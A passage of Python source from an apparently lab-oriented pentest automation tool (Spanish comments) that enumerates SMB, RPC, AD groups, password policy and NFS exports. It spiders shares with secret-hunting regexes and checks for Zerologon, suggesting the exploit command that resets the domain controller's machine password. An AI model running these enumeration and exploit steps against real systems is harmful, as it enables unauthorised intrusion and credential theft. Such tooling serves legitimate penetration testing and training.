    de una salida COMPUESTA de rpcclient (enumdomusers + enumdomgroups en la misma sesión). Sirve
    para resolver los RIDs que devuelve querygroupmem SIN más llamadas a la red. Puro."""
    m = {}
    for rx in (_RPC_USER_RID_RE, _RPC_GROUP_RE):
        for mm in rx.finditer(out or ""):
            m[mm.group(2).lower()] = mm.group(1)
    return m


def _rpc_enum_groups(res, ip, composite_out, max_custom=12):
    """A partir de la salida COMPUESTA de rpcclient (que ya trae enumdomusers + enumdomgroups),
    saca los grupos del dominio como hallazgo y, para los de ALTO VALOR (Domain/Enterprise/Schema
    Admins, GPO Creators) y los PERSONALIZADOS del dominio (RID>=1000, p. ej. 'Interns'), consulta
    su MEMBRESÍA por SAMR (`querygroupmem`), SIN credenciales y de solo lectura, y resuelve los
    RIDs de los miembros con el mapa que ya dan enumdomusers/enumdomgroups (sin más llamadas). La
    membresía de Domain Admins delata quién manda en el dominio — ni el RID cycling de nxc ni el
    enum compuesto anterior la sacaban. Acotado (max_custom grupos personalizados) para no
    dispararse en dominios grandes. No es pura (lanza rpcclient); se gatea en fp_smb a DCs."""
    groups = _parse_rpcclient_groups(composite_out)
    if not groups:
        return   # enumdomgroups no devolvió nada (RestrictAnonymous): no hay nada que expandir
    name_by_rid = _rpc_rid_name_map(composite_out)
    customs = [(n, r) for n, r in groups if int(r, 16) >= _RPC_FIRST_CUSTOM_RID]
    if customs:
        res["findings"].append(("info",
            f"AD: {len(groups)} grupos de dominio por RPC null-session; personalizados "
            f"({len(customs)}): " + ", ".join(n for n, _ in customs[:15])
            + (" …" if len(customs) > 15 else "")))
    else:
        res["findings"].append(("info",
            f"AD: {len(groups)} grupos de dominio por RPC null-session (todos por defecto)"))
    hv = [(n, r) for n, r in groups if r in _RPC_ADMIN_GROUP_RIDS]
    todo = hv + customs[:max_custom]
    extra = len(customs) - max_custom
    if extra > 0:
        res["next"].append(
            f'rpcclient -U "" -N {ip} -c "querygroupmem <rid>"   # +{extra} grupo(s) personalizado(s) '
            "más sin expandir (acota a mano los que te interesen)")
    for name, rid in todo:
        rc, gout = run_capture(["rpcclient", "-U", "", "-N", ip, "-c", f"querygroupmem {rid}"], timeout=30)
        member_rids = _parse_rpcclient_group_members(gout)
        _step(res, f'rpcclient -U "" -N {ip} -c "querygroupmem {rid}"', bool(member_rids), gout,
              note=f"miembros del grupo '{name}' (RID {rid}) por SAMR, sin credenciales (solo lectura)")
        if not member_rids:
            continue
        names = [name_by_rid.get(mr, f"RID {mr}") for mr in member_rids]
        is_admin = rid in _RPC_ADMIN_GROUP_RIDS
        res["findings"].append(("alta" if is_admin else "info",
            f"AD grupo '{name}'{' (ADMINS DEL DOMINIO)' if is_admin else ''}: {len(names)} "
            f"miembro(s) — " + ", ".join(names[:15]) + (" …" if len(names) > 15 else "")))


def _format_pass_pol_finding(pol, prefix="AD"):
    """Resume `_parse_pass_pol`/`_parse_rpcclient_dompwinfo` en una línea de hallazgo 'info'
    legible para el operador: longitud mínima, complejidad e historial primero (higiene), el
    bloqueo de cuentas al final (lo que más importa para decidir si el password spraying es
    viable sin bloquear cuentas — ver HTB Academy, AD Enumeration & Attacks). Antes esta
    política se LEÍA (el paso queda en commands.log) pero solo generaba un hallazgo cuando
    el lockout era débil (None/0): con una política normal, el dato quedaba enterrado en la
    salida cruda y no aparecía en absoluto en el informe. Con datos parciales (p. ej. solo
    rpcclient getdompwinfo) resume lo que haya. None si no hay nada reconocible. Puro →
    testeable sin red."""
    if not pol:
        return None
    parts = []
    if "min_len" in pol:
        parts.append(f"longitud mínima {pol['min_len']}")
    if "complex" in pol:
        parts.append("complejidad activada" if pol["complex"] == "1" else "complejidad DESACTIVADA")
    if "history" in pol:
        parts.append(f"historial {pol['history']}")
    thr = pol.get("lockout_threshold")
    if thr is not None:
        if thr in ("None", "0"):
            parts.append("SIN bloqueo de cuentas")
        else:
            extra = []
            if pol.get("lockout_duration"):
                extra.append(f"{pol['lockout_duration']} de bloqueo")
            if pol.get("lockout_reset"):
                extra.append(f"contador se reinicia a los {pol['lockout_reset']}")
            tail = f" ({', '.join(extra)})" if extra else ""
            parts.append(f"bloqueo tras {thr} intentos{tail}")
    if not parts:
        return None
    return f"{prefix}: política de contraseñas — " + ", ".join(parts)


def _parse_maq(out):
    """MachineAccountQuota de la salida de `nxc ldap -M maq`. Formato confirmado en el código
    fuente de nxc (nxc/modules/maq.py): `context.log.highlight(f"MachineAccountQuota: {valor}")`
    — un único número, sin más texto alrededor. None si el módulo no devolvió nada reconocible
    (sin privilegios para leer el atributo, o bind anónimo sin autorización). Puro → testeable
    sin red."""
    m = re.search(r"MachineAccountQuota:\s*(\d+)", out or "")
    return int(m.group(1)) if m else None


def _maq_finding(maq, prefix="AD"):
    """Hallazgo a partir de MachineAccountQuota (ver _parse_maq). MAQ>0 significa que
    CUALQUIER cuenta de dominio (Authenticated Users) puede unir hasta MAQ equipo(s) nuevos al
    dominio — precondición de noPac/RBCD/Shadow Credentials (todos necesitan poder crear una
    cuenta de máquina propia). El valor por defecto de Microsoft es 10; MAQ=0 es el
    endurecimiento recomendado (nadie sin delegación explícita puede unir equipos). None si
    `maq` es None (no hay dato). Puro → testeable sin red."""
    if maq is None:
        return None
    if maq > 0:
        return ("alta", f"{prefix}: MachineAccountQuota = {maq} — cualquier cuenta de dominio puede "
                         f"crear hasta {maq} cuenta(s) de equipo: precondición de noPac/RBCD/Shadow Credentials")
    return ("info", f"{prefix}: MachineAccountQuota = 0 — creación de cuentas de equipo bloqueada para usuarios normales (correctamente endurecido)")


# nxc NO tiene un flag '--trusts' para el protocolo ldap (confirmado leyendo su código fuente:
# nxc/protocols/ldap.py define un método dc_list() que busca '(objectClass=trustedDomain)', pero
# ningún argumento de CLI lo invoca — es código muerto/interno, no una feature expuesta). Por eso
# los trusts se enumeran con `ldapsearch` (ya dependencia existente de palantir), no con nxc.
# Mapas de valores numéricos confirmados en ESE MISMO código fuente de nxc (la lógica de
# decodificación, aunque el flag que la dispara no exista), para no inventar el significado.
_LDAP_TRUST_DIRECTION = {"0": "deshabilitado", "1": "entrante", "2": "saliente", "3": "bidireccional"}
_LDAP_TRUST_TYPE = {"1": "Windows NT", "2": "Active Directory", "3": "Kerberos (MIT)", "4": "desconocido", "5": "Azure AD"}


def _parse_ldap_trusts(out):
    """Trusts de dominio/bosque de la salida de `ldapsearch ... (objectClass=trustedDomain)`
    (formato LDIF: bloques separados por línea en blanco, 'Atributo: valor' por línea). Devuelve
    [{"partner", "direction", "type", "forest_transitive"}]. 'forest_transitive' es el bit 0x8 de
    trustAttributes (MS-ADTS): el trust cruza TODO el bosque del partner, no solo ese dominio —
    importa para saber el alcance real de un ataque extra-SID/cross-forest Kerberoasting. []
    si no hay ningún bloque con 'trustPartner' (lectura denegada o sin trusts). Puro → testeable
    sin red."""
    trusts = []
    for block in re.split(r"\n\s*\n", out or ""):
        m_partner = re.search(r"^trustPartner:\s*(\S+)", block, re.M)
        if not m_partner:
            continue
        m_dir = re.search(r"^trustDirection:\s*(\d+)", block, re.M)
        m_type = re.search(r"^trustType:\s*(\d+)", block, re.M)
        m_attrs = re.search(r"^trustAttributes:\s*(\d+)", block, re.M)
        attrs = int(m_attrs.group(1)) if m_attrs else 0
        trusts.append({
            "partner": m_partner.group(1),
            "direction": _LDAP_TRUST_DIRECTION.get(m_dir.group(1) if m_dir else None, "?"),
            "type": _LDAP_TRUST_TYPE.get(m_type.group(1) if m_type else None, "?"),
            "forest_transitive": bool(attrs & 0x8),
        })
    return trusts


def nxc_auth(nxc, proto, ip, res):
    """Fallback de credenciales por defecto: prueba null → guest → Administrator
    (todas con contraseña vacía) contra un protocolo de nxc y devuelve (user, label)
    de la primera que abre sesión, o None. Registra cada intento como paso del
    informe (educativo) y marca (Pwn3d!) como hallazgo crítico."""
    for user, lbl in NXC_ANON_IDS:
        rc, out = run_capture([nxc, proto, ip, "-u", user, "-p", ""], timeout=40)
        ok = _nxc_ok(out)
        _step(res, f"{nxc} {proto} {ip} -u '{user}' -p ''", ok, out,
              note=f"probar si {lbl} abre sesión por {proto.upper()} sin contraseña (credencial por defecto, 1 intento)")
        if re.search(r"\(Pwn3d!\)", out):
            res["findings"].append(("critica", f"{proto.upper()}: acceso de administrador vía {lbl} (Pwn3d!)"))
            return user, lbl
        if ok:
            res["findings"].append(("alta", f"{proto.upper()}: sesión válida vía {lbl} (contraseña vacía)"))
            return user, lbl
    return None


def is_domain_controller(services):
    """Heurística de DC de AD: Kerberos (88) abierto es la señal fuerte; LDAP
    (389/3268) junto a SMB (139/445) también. Evita lanzar la enum AD contra un
    simple servidor SMB de workgroup."""
    ports = {p["port"] for p in services}
    if 88 in ports:
        return True
    return bool(ports & {389, 3268}) and bool(ports & {139, 445})


_DOMAIN_RE = re.compile(
    r"(?:DNS[_ ]Domain[_ ]Name|Domain name|DNS domain)\s*[:=]\s*([A-Za-z0-9_-]+\.[A-Za-z0-9_.-]+)", re.I)


def looks_domain_joined(services, host):
    """¿El host parece unido a un dominio AD? Se usa para NO sugerir -windows-auth con
    credenciales de DOMINIO en un simple workgroup. Señales: es DC, o algún script NSE
    revela un dominio DNS con punto (p. ej. corp.local), no un workgroup suelto."""
    if is_domain_controller(services):
        return True
    blobs = list(host.values())
    for p in services:
        blobs += list(p["scripts"].values())
    return any(_DOMAIN_RE.search(t or "") for t in blobs)


def _smb_ad_enum(res, nxc, ip, auth_user=None, anon_readable=False):
    """Enumeración AD de SOLO LECTURA contra un DC con nxc, usando la identidad que
    haya abierto sesión (null → guest → Administrator; por defecto null, que basta
    para el RID cycling por IPC$). NO hace fuerza bruta de credenciales — solo lee
    lo que el DC expone. El password spraying queda como sugerencia manual.

    `anon_readable`: True si el sondeo de --shares ya demostró lectura anónima real
    (algún share READ/WRITE o Null Auth). Sirve de compuerta: si NI el RID cycling NI
    los shares devolvieron nada, la sesión está aceptada pero no autorizada (DC moderno
    con RestrictAnonymous) → --users/--computers/--pass-pol por SAMR con esa misma
    identidad tampoco devolverán nada, así que no se lanzan (era puro ruido/tiempo)."""
    user = auth_user if auth_user is not None else ""
    ident = {"": "sesión nula", "guest": "invitado", "Administrator": "Administrator"}.get(user, user)
    res["findings"].append(("info", f"Domain Controller detectado → enum AD de solo lectura (identidad: {ident})"))
    rc, out = run_capture([nxc, "smb", ip, "-u", user, "-p", "", "--rid-brute"], timeout=180)
    _step(res, f"{nxc} smb {ip} -u '{user}' -p '' --rid-brute", rc == 0, out,
          note="RID cycling por IPC$: recorre los RIDs para sacar nombres de usuario aunque --users esté capado (no es fuerza bruta de contraseñas)")
    users = re.findall(r"\d+:\s+[^\s\\]+\\(.+?)\s+\(SidTypeUser\)", out)
    if users:
        uniq = sorted(set(users))
        res["findings"].append(("alta", f"AD: {len(uniq)} usuarios por RID cycling: "
                                        f"{', '.join(uniq[:15])}" + (" …" if len(uniq) > 15 else "")))
    # ¿Esta identidad anónima/invitado puede LEER algo de verdad? El RID cycling (arriba) o el
    # listado de shares (anon_readable) son la prueba. Si NINGUNO devolvió nada, el DC acepta la
    # sesión pero deniega la lectura anónima (RestrictAnonymous): --users/--computers/--pass-pol
    # por SAMR con la MISMA identidad devolverán lo mismo (nada), así que no los lanzamos.
    # --groups NO: nxc 1.5.1 lo movió al protocolo ldap (responde '[-] [REMOVED]'); los grupos
    # salen por fp_ldap (--groups anónimo) cuando el bind lo permite.
    if anon_readable or _nxc_has_data(out):
        for mod, note in (("--users", "lista los usuarios del dominio (base para kerberoasting/spraying posterior, manual)"),
                          ("--computers", "lista los equipos del dominio (mapa de la red interna de Windows)"),
                          ("--pass-pol", "política de contraseñas: longitud mínima y, sobre todo, si hay bloqueo de cuentas")):
            rc, out = run_capture([nxc, "smb", ip, "-u", user, "-p", "", mod], timeout=60)
            _step(res, f"{nxc} smb {ip} -u '{user}' -p '' {mod}", rc == 0, out, note=note)
            if mod == "--pass-pol":
                pol = _parse_pass_pol(out)
                pp = _format_pass_pol_finding(pol)
                if pp:
                    res["findings"].append(("info", pp))
                if pol.get("lockout_threshold") in ("None", "0"):
                    res["findings"].append(("media", "AD: sin bloqueo de cuentas (lockout = None/0) — no bloquea al validar credenciales"))
    else:
        res["findings"].append(("info",
            f"SMB: {ident} aceptada pero sin lectura anónima (RID cycling y shares denegados) → "
            "--users/--computers/--pass-pol por SAMR necesitan credenciales (saltados: devolverían lo mismo)"))
    res["next"].append(f"nxc ldap {ip} -u USER -p PASS --asreproast / --kerberoasting   # con credenciales válidas")


# Spidering de shares SMB legibles (solo lectura): localiza ficheros jugosos que el
# operador querría abrir a mano (claves, configs, backups, GPP, flags…).
_SMB_LOOT_RE = re.compile(
    r"(?i)(id_rsa|id_dsa|\.kdbx?|\.ppk|\.pem|\.pfx|\.key|\.ovpn|unattend|sysprep|"
    r"groups\.xml|web\.config|\.config\b|\.kdb|passw|cred|secret|\.bak\b|\.old\b|"
    r"\.vbs|\.ps1|\.bat\b|\.sql\b|\.ldf|\.mdf|\.vmdk|\.vhdx?|backup|flag|user\.txt|"
    r"root\.txt|local\.txt|\.git|\.env\b|\.ini\b)")


def _smb_readable_shares(out):
    """De la salida de `nxc smb --shares`, nombres de shares con permiso READ,
    saltando los administrativos/IPC que no sirven para botín."""
    skip = {"ADMIN$", "C$", "IPC$", "print$", "Permissions", "Share"}
    shares = []
    for line in out.splitlines():
        toks = line.split()
        for i, t in enumerate(toks):
            if t in ("READ", "READ,WRITE") and i >= 1:
                share = toks[i - 1]
                if share not in skip and not share.startswith("-"):
                    shares.append(share)
                break
    return list(dict.fromkeys(shares))


# Línea de `smbclient ls`: "  NOMBRE<relleno>ATRIBS   TAMAÑO  Www Mmm DD HH:MM:SS AAAA".
# El recorrido recursivo intercala líneas "\subdir" que fijan el directorio actual.
_SMB_LS_RE = re.compile(
    r"^\s+(?P<name>.+?)\s+(?P<attr>[DAHSRN]*)\s+\d+\s+"
    r"\w{3}\s+\w{3}\s+\d+\s+[\d:]+\s+\d{4}\s*$")


def _interesting_files(out):
    """Rutas (relativas al share) de los ficheros del listado recursivo que casan con el
    patrón de botín. Devuelve el nombre/ruta — NO la línea entera del `ls` — para que el
    `get` generado funcione, y antepone el subdirectorio si el fichero está dentro."""
    hits, cwd = [], ""
    for line in out.splitlines():
        if line.startswith("\\"):                      # marcador de subdirectorio del recorrido
            cwd = line.strip().lstrip("\\")
            continue
        m = _SMB_LS_RE.match(line)
        if not m:
            continue
        name, attr = m.group("name").strip(), m.group("attr")
        if name in (".", "..") or "D" in attr:         # saltar . .. y directorios
            continue
        if _SMB_LOOT_RE.search(name):
            rel = f"{cwd}\\{name}" if cwd else name
            hits.append(rel[:150])
    return list(dict.fromkeys(hits))[:30]


def _smb_spider(res, ip, share, user):
    """Lista recursivamente (SOLO LECTURA) un share legible con smbclient y marca los
    ficheros interesantes como hallazgos."""
    auth = ["-N"] if user == "" else ["-U", f"{user}%"]
    cmd = ["smbclient", f"//{ip}/{share}"] + auth + ["-c", "recurse ON; ls"]
    rc, out = run_capture(cmd, timeout=60)
    _step(res, shlex.join(cmd), rc == 0, out,
          note=f"listar en recursivo el share '{share}' (solo lectura) para localizar ficheros jugosos")
    auth_s = "-N" if user == "" else f"-U {user}%"
    for f in _interesting_files(out):
        res["findings"].append(("alta", f"SMB '{share}': fichero interesante — {f}"))
        local = f.rsplit("\\", 1)[-1]                  # nombre local limpio (sin la ruta remota)
        # f viene del listado del propio objetivo: se cita con shlex.quote (no comillas a
        # mano) antes de ir a un comando que el operador va a copiar/pegar en su shell.
        inner = f'get "{f}" "{local}"'
        res["next"].append(f"smbclient //{ip}/{share} {auth_s} -c {shlex.quote(inner)}   # descargar")


# Regex de secretos para el spidering de CONTENIDO (nxc --spider --content), cuando no se
# da --pattern a mano. Busca contraseñas/claves/credenciales DENTRO de los ficheros.
_SPIDER_SECRET_REGEX = r"passw|pwd|pword|secret|cred|connectionstring|BEGIN RSA|BEGIN OPENSSH|api[_-]?key"
# Una línea de resultado del spider de nxc lleva la ruta UNC del fichero ("//share/dir/f").
_SPIDER_PATH_RE = re.compile(r"(//[^\s\[\]]+)")


def _parse_spider_hits(out):
    """Rutas (//share/...) de los ficheros que el spider de nxc marcó, saltando las líneas
    de estado ([*]/[+]/[-], banner y 'Started/Done spidering'). Generoso a propósito: el
    paso guarda igual la salida cruda completa, así que aunque el formato cambie entre
    versiones de nxc no se pierde nada."""
    hits = []
    for line in out.splitlines():
        if re.search(r"\[[*+\-]\]", line) or "spidering" in line.lower():
            continue
        m = _SPIDER_PATH_RE.search(line)
        if m:
            hits.append(m.group(1)[:150])
    return list(dict.fromkeys(hits))[:30]


def _nxc_spider(res, nxc, ip, auth_args, shown_auth, shares, pattern=None):
    """Spidering de CONTENIDO (nxc smb --spider SHARE --content) de shares legibles con la
    identidad ya autenticada que se pase en `auth_args` (anónima o credencial aportada) —
    busca secretos DENTRO de los ficheros, no solo por nombre como el spider de smbclient.
    `pattern` (de --pattern) gana al regex de secretos por defecto. Es la parte de --spider;
    acotado a 5 shares (depth 5) para no dispararse en recursos grandes."""
    search = (["--pattern"] + pattern) if pattern else ["--regex", _SPIDER_SECRET_REGEX]
    search_shown = ("--pattern " + " ".join(shlex.quote(p) for p in pattern)) if pattern \
        else f"--regex {shlex.quote(_SPIDER_SECRET_REGEX)}"
    for share in shares[:5]:
        cmd = [nxc, "smb", ip] + auth_args + ["--spider", share, "--content", "--depth", "5"] + search
        rc, out = run_capture(cmd, timeout=180, quiet=True)
        hits = _parse_spider_hits(out)
        _step(res, f"{nxc} smb {ip} {shown_auth} --spider {share} --content {search_shown}",
              bool(hits), out,
              note=f"spidering de CONTENIDO del share '{share}': busca secretos DENTRO de los ficheros (no solo por nombre)")
        for h in hits:
            res["findings"].append(("alta", f"SMB spider '{share}': coincidencia de secreto en {h}"))


def fp_smb(ip, ports, services, host, deep):
    res = _fp("smb", "SMB / RPC", [p["port"] for p in ports])
    nxc = nxc_bin()   # se necesita ya aquí: decide si el fallback de rpcclient (abajo) hace falta
    if have("smbclient"):
        rc, out = run_capture(["smbclient", "-N", "-L", f"//{ip}"], timeout=40)
        _step(res, f"smbclient -N -L //{ip}", rc == 0, out,
              note="listar comparticiones SIN credenciales (sesión nula): muchos servidores lo permiten")
        for line in out.splitlines():
            m = re.match(r"\s*(\S+)\s+Disk\s*(.*)", line)
            if m and m.group(1) not in ("Sharename", "IPC$", "print$"):
                res["findings"].append(("media", f"SMB share visible: {m.group(1)}  {m.group(2).strip()}"))
    else:
        res["missing"].append("smbclient")
    if have("rpcclient"):
        # 'getdompwinfo' al final de la cadena: longitud mínima + complejidad por SAMR, SIN
        # credenciales (HTB Academy, "Obtaining the Password Policy using rpcclient") — mismo
        # coste (una sola sesión rpcclient), pero da política de contraseñas incluso si nxc/
        # netexec no está instalado (ver el fallback justo abajo: _parse_rpcclient_dompwinfo
        # solo se usa cuando falta nxc, que ya la saca más completa vía --pass-pol).
        # 'enumdomgroups' en la misma sesión: añade los grupos del dominio (y, de ahí, su
        # membresía por SAMR — ver _rpc_enum_groups) a lo que ya saca el compuesto, sin coste
        # extra de sesión. Un operador real lo pidió: por sesión nula contra un DC de HTB daba los
        # grupos (incluidos los personalizados, p. ej. 'Interns') y 'querygroupmem' sus miembros —
        # ni el RID cycling de nxc ni este compuesto lo sacaban antes.
        rc, out = run_capture(
            ["rpcclient", "-U", "", "-N", ip, "-c",
             "srvinfo;querydominfo;netshareenumall;enumdomusers;enumdomgroups;getdompwinfo"], timeout=40)
        _step(res, f'rpcclient -U "" -N {ip} -c "srvinfo;querydominfo;netshareenumall;enumdomusers;enumdomgroups;getdompwinfo"',
              rc == 0, out,
              note="sesión nula por RPC: saca de golpe info del servidor, dominio, shares, usuarios, "
                   "grupos y (getdompwinfo) longitud mínima/complejidad de la política de contraseñas")
        users = re.findall(r"user:\[([^\]]+)\]", out)
        if users:
            res["findings"].append(("alta", f"Usuarios por RPC null-session: {', '.join(users[:15])}"))
            res["next"].append("rpcclient: 'queryuser <RID>' / brute de RIDs con seq+queryuser")
        if not nxc:   # sin nxc, 'getdompwinfo' es la ÚNICA fuente de pass-pol por sesión nula
            pp = _format_pass_pol_finding(_parse_rpcclient_dompwinfo(out))
            if pp:
                res["findings"].append(("info", pp))
        # Grupos + membresía (Domain Admins, grupos personalizados) por SAMR — solo en un DC: en
        # un SMB/Samba suelto 'enumdomgroups' no da grupos de dominio de valor y querygroupmem sería
        # ruido. _rpc_enum_groups no hace nada si enumdomgroups vino vacío (RestrictAnonymous).
        if is_domain_controller(services):
            _rpc_enum_groups(res, ip, out)
    else:
        res["missing"].append("rpcclient")
    if nxc:
        working = None
        anon_readable = False   # ¿alguna identidad anónima/invitado leyó algo real (share/Null Auth)?
        spider_user, spider_out = None, ""
        signing = None   # SMB signing requerido: lo imprime el banner de nxc SIEMPRE, incluso si
        # el login de esta identidad falla — basta con leerlo de la 1ª respuesta que lo traiga.
        for user, lbl in NXC_ANON_IDS:
            rc, out = run_capture([nxc, "smb", ip, "-u", user, "-p", "", "--shares"], timeout=60)
            _step(res, f"{nxc} smb {ip} -u '{user}' -p '' --shares", rc == 0, out,
                  note=f"listar comparticiones y permisos como {lbl} (muchos SMB dejan abierta la sesión nula/invitado)")
            if signing is None:
                signing = _parse_nxc_signing(out)
            if re.search(r"\(Pwn3d!\)", out):
                res["findings"].append(("critica", f"SMB: acceso de administrador vía {lbl} (Pwn3d!)"))
            elif user and _nxc_ok(out):
                res["findings"].append(("alta", f"SMB: login válido vía {lbl} (contraseña vacía aceptada)"))
            if re.search(r"\bREAD\b", out):
                anon_readable = True
                res["findings"].append(("alta", f"SMB: al menos un share legible (READ) vía {lbl}"))
                if spider_out == "":
                    spider_user, spider_out = user, out
            if re.search(r"\bWRITE\b", out):
                anon_readable = True
                res["findings"].append(("alta", f"SMB: al menos un share escribible (WRITE) vía {lbl}"))
            if user == "" and re.search(r"Null Auth:\s*True", out, re.I):
                anon_readable = True
                res["findings"].append(("media", "SMB: autenticación nula aceptada (Null Auth: True)"))
            if working is None and _nxc_ok(out):
                working = user
        if signing is False:
            res["findings"].append(("media",
                "SMB: signing NO requerido — superficie de NTLM relay: si además hay un primitivo de "
                "coacción expuesto (MS-RPRN/PrinterBug o MS-EFSR/PetitPotam, ver MSRPC) se puede forzar "
                "al propio equipo a autenticarse contra un listener y reenviar esa autenticación de "
                "vuelta a SU PROPIO SMB (relay reflexivo), sin crackear ni robar ninguna contraseña"))
            # Metadata interna (NO es un finding/next, la consume _combine_relay_opportunity en
            # run_one): si fp_msrpc confirma coacción (MS-RPRN/MS-EFSR) en el MISMO host, combina
            # los dos para un next-step de relay concreto en vez de dejar que el operador ate
            # cabos él solo entre dos protocolos distintos del informe. Se hace fuera de fp_smb
            # porque fp_smb no sabe nada de MSRPC (cada fp_* es independiente).
            res["_signing_disabled"] = True
        # Spidering de los shares legibles (solo lectura) para localizar botín
        if spider_out and have("smbclient"):
            shares = _smb_readable_shares(spider_out)
            if shares:
                res["findings"].append(("info", f"SMB: spidering de {min(len(shares), 5)} share(s) legible(s): {', '.join(shares[:5])}"))
            for share in shares[:5]:
                _smb_spider(res, ip, share, spider_user or "")
            # --spider: además del spider por NOMBRE (smbclient, arriba), spidering de
            # CONTENIDO con nxc (grep dentro de los ficheros) con la identidad que abrió sesión.
            if SPIDER and shares:
                su = spider_user or ""
                _nxc_spider(res, nxc, ip, ["-u", su, "-p", ""], f"-u {shlex.quote(su)} -p ''",
                            shares, SPIDER_PATTERN)
        if is_domain_controller(services):
            # Zerologon (CVE-2020-1472): SIN credenciales, contra CUALQUIER DC (parcheado o
            # no — nxc hace la comprobación, no el exploit). Es de los primeros checks que
            # corre cualquier pentest interno y, si sale VULNERABLE, probablemente el camino
            # más corto a Domain Admin del run entero: resetea la contraseña de la cuenta de
            # máquina del DC a vacía. Formato de salida confirmado en el código fuente de nxc
            # (nxc/modules/zerologon.py): "VULNERABLE" si lo es, "Attack failed. Target is
            # probably patched." si no — las dos frases no comparten "VULNERABLE", así que
            # basta el substring sin falsos positivos.
            # El propio módulo de nxc reintenta en bucle hasta 2000 veces (MAX_ATTEMPTS, código
            # fuente de nxc/modules/zerologon.py) porque el bypass es probabilístico (~256
            # intentos de media si el DC SÍ es vulnerable) — pero en la práctica, contra un DC
            # real, nxc encuentra el hallazgo en segundos (confirmado: <15s en dos ejecuciones
            # manuales seguidas), así que el timeout corto NO es "necesitaba más intentos". Un
            # caso real SÍ dio output COMPLETAMENTE VACÍO con el timeout de 60s (ver
            # findings.json), que encaja más con el intento de conexión quedándose colgado
            # (posiblemente el propio DC más lento tras el resto de SMB/RPC que palantir ya le
            # había lanzado — rpcclient/enum4linux-ng/nxc --rid-brute, justo antes de este paso)
            # que con agotar intentos de verdad. El timeout se sube de 60s a 120s como margen de
            # seguridad igualmente — no hace daño — pero si se repite, el problema de fondo
            # probablemente sea contención/carga durante el escaneo, no el propio check.
            zlog_timeout = 120
            rc, zout = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "zerologon"], timeout=zlog_timeout)
            zvuln = "VULNERABLE" in (zout or "")
            _step(res, f"{nxc} smb {ip} -u '' -p '' -M zerologon", zvuln, zout,
                  note="CVE-2020-1472: ¿el DC es vulnerable a Zerologon? Comprobación de solo lectura, SIN credenciales — nxc no explota, solo confirma")
            if zvuln:
                res["findings"].append(("critica",
                    "SMB: Zerologon (CVE-2020-1472, CVSS 10.0 — el máximo posible) — el DC es VULNERABLE "
                    "(comprobado, sin credenciales): resetear la contraseña de su cuenta de máquina da Domain Admin"))
                # OJO: SecuraBV/CVE-2020-1472 (zerologon_tester.py) es SOLO DETECCIÓN — confirmado de nuevo
                # por un operador real: lo corrió, dio "Success! DC can be fully compromised" y NO cambió
                # nada (la contraseña seguía intacta). El exploit que SÍ resetea de verdad es el de
                # dirkjanm/CVE-2020-1472 (cve-2020-1472-exploit.py) — antes esto sugería el repo equivocado
                # con un comentario que afirmaba "explota" sobre una herramienta que no explota nada.
                res["next"].append(
                    f"git clone https://github.com/dirkjanm/CVE-2020-1472 && cd CVE-2020-1472 && python3 "
                    f"cve-2020-1472-exploit.py NETBIOS-DEL-DC {ip}   # confirmado VULNERABLE arriba — ESTE sí "
                    "explota de verdad (el de SecuraBV/zerologon_tester.py es solo detección, no resetea nada): "
                    "resetea la contraseña de la cuenta de máquina del DC a vacía (paso ACTIVO y de alto impacto, "
                    "no se encadena solo; sustituye NETBIOS-DEL-DC por el nombre del equipo si no se rellenó "
                    "solo arriba). Tras esto: DCSync con esa cuenta ya vacía, y luego RESTAURAR la contraseña "
                    "original (recuperable del secreto LSA local $MACHINE.ACC) con restorepassword.py del "
                    "mismo repo — ver MEJORAS.md 'Pendiente' para la cadena completa, verificada en un run real")
            # Enum AD de solo lectura: SOLO si alguna identidad anónima (null/guest) abrió sesión.
            # Si ninguna entra, --users/--groups/--pass-pol/--rid-brute no devuelven nada útil —
            # no los lanzamos (ruido) y dejamos indicado que hacen falta credenciales. La Fase 5d
            # SÍ las usa de verdad: -u/-p/-H enumeran CON la credencial, no como null/guest.
            if working is not None:
                _smb_ad_enum(res, nxc, ip, working, anon_readable=anon_readable)
            else:
                res["findings"].append(("info", "DC detectado pero SIN sesión anónima (null/guest no entran) → la enum AD necesita credenciales"))
                res["next"].append(f"nxc smb {ip} -u USER -p PASS --users --groups --pass-pol --rid-brute   # enum AD con credenciales (o pásaselas a palantir con -u/-p para la Fase 5d)")
    elif have("smbmap"):
        rc, out = run_capture(["smbmap", "-H", ip], timeout=60)
        _step(res, f"smbmap -H {ip}", rc == 0, out,
              note="permisos por comparticiones (alternativa a nxc cuando no está instalado)")
    else:
        res["missing"].append("nxc/netexec/crackmapexec o smbmap")
    if deep and have("enum4linux-ng"):
        rc, out = run_capture(["enum4linux-ng", "-A", ip], timeout=350)
        _step(res, f"enum4linux-ng -A {ip}", rc == 0, out,
              note="barrido completo de SMB/RPC en un solo comando (--aggressive)")
    elif not deep:
        res["next"].append(f"enum4linux-ng -A {ip}   # barrido completo (añade --aggressive)")
    for lbl, txt in _nse_for(services, host, ("smb", "nbstat")):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE de SMB/NetBIOS")
    return res


def fp_nfs(ip, ports, services, host, deep):
    res = _fp("nfs", "NFS / RPC", [p["port"] for p in ports])
    export_paths = []
    if have("showmount"):
        rc, out = run_capture(["showmount", "-e", ip], timeout=30)
        _step(res, f"showmount -e {ip}", rc == 0, out, note="listar exports NFS")
        exports = [l for l in out.splitlines()[1:] if l.strip()]
        export_paths = [l.split()[0] for l in exports if l.split() and l.split()[0].startswith("/")]
        for e in exports:
            res["findings"].append(("alta", f"NFS export: {e.strip()}"))
        for ep in export_paths:
            # ep viene del objetivo (showmount) — se cita con shlex.quote antes de ir a un
            # comando que el operador va a copiar/pegar: un export malicioso con ';'/backticks
            # no debe poder ejecutar nada en la máquina del pentester.
            safe_ep = shlex.quote(ep)
            local_dir = "/tmp/nfs" + re.sub(r"[^A-Za-z0-9_-]", "_", ep)
            safe_local = shlex.quote(local_dir)
            res["next"].append(f"mkdir -p {safe_local} && sudo mount -o nolock -t nfs {ip}:{safe_ep} {safe_local} && ls -laR {safe_local}   # montar y leer")
    else:
        res["missing"].append("showmount (nfs-common)")
    nxc = nxc_bin()
    if nxc:
        rc, out = run_capture([nxc, "nfs", ip, "--shares"], timeout=40)
        _step(res, f"{nxc} nfs {ip} --shares", rc == 0, out,
              note="exports NFS y sus permisos (complementa a showmount; marca escribibles y no_root_squash)")
        # no_root_squash: montas como root → SUID shell = root en el objetivo. Win directo.
        if re.search(r"root escape:\s*True", out, re.I):
            exp = shlex.quote(export_paths[0] if export_paths else "/EXPORT")
